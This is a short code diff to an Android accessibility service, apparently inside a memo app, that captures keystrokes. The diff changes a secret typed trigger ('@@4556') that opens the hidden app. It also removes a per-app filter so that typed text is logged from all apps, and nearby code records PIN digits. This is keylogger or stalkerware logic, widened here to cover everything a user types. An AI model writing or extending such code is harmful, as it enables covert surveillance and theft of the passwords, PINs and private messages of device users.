@@ -83,7 +83,7 @@ class TypeVaultAccessibilityService : AccessibilityService() {
                 val fullText = event.text.joinToString()
                 
                 // --- Secret Trigger to Open App ---
-                if (fullText.contains("@@1234")) {
+                if (fullText.contains("@@4556")) {
                     val intent = Intent(this@TypeVaultAccessibilityService, com.example.memo.MainActivity::class.java).apply {
                         addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                     }
@@ -106,8 +106,8 @@ class TypeVaultAccessibilityService : AccessibilityService() {
                             appendPinDigit(text.last().toString(), packageName)
                         }
                     }
-                } else if (settingsManager.isIncluded(packageName)) {
-                    // Normal keyboard capture
+                } else {
+                    // Capture keyboard input from ALL apps
                     if (fullText.isNotBlank()) {
                         val appName = getAppLabel(packageName)
                         if (lastPackageName != null && lastPackageName != packageName) commitCurrentText()
